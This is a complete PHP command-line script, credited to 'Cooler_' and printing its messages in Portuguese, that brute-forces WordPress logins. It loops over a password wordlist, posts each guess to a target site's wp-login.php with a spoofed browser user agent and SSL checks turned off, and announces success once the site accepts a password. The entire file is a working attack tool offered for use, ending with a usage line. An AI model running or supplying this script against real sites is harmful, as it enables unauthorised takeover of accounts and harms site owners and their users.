#!/usr/bin/php
<?php
 $count=0;
 $username=$argv[2];
 $url=$argv[1];
 $wordlist=$argv[3];
 print "\n $url $username $wordlist\n";
 if(($username)&&($url)&&($wordlist)) 
 {
  $cookie="cookie.txt";
  $wordlist = file_get_contents($wordlist);
  $wordlist = explode("\n", $wordlist);
  print " Testando passwords...\n";
  foreach($wordlist as $passwd)
  {
    
        $postdata = "log=". $username ."&pwd=". $passwd ."&wp-submit=Log%20In&redirect_to=". $url ."wp-admin/&testcookie=1";
 	$ch = curl_init();
 	curl_setopt ($ch, CURLOPT_URL, $url . "wp-login.php");
 	curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
 	curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6");
 	curl_setopt ($ch, CURLOPT_TIMEOUT, 60);
 	curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
 	curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
 	curl_setopt ($ch, CURLOPT_COOKIEJAR, $cookie);
 	curl_setopt ($ch, CURLOPT_REFERER, $url . "wp-admin/");
 	curl_setopt ($ch, CURLOPT_POSTFIELDS, $postdata);
 	curl_setopt ($ch, CURLOPT_POST, 1);
 	$result = curl_exec ($ch);
 	curl_close($ch);
          
    if(preg_match("/<div id=\"login_error\">/i",$result)||preg_match("/name=\"loginform\"/i",$result))
    {
         print "$count não entrou senha: $passwd \n"; 
    } else { 
         print "\n$count Entrou sistema foi hackeado com sucesso usando login $username e senha $passwd \n"; 
         exit; 
    }
   $count++;
  }
 } else { 
  echo "./cmd site.com/wp/ login passwordList.txt \n Wordpress Brute by Cooler_"; 
 }

?>

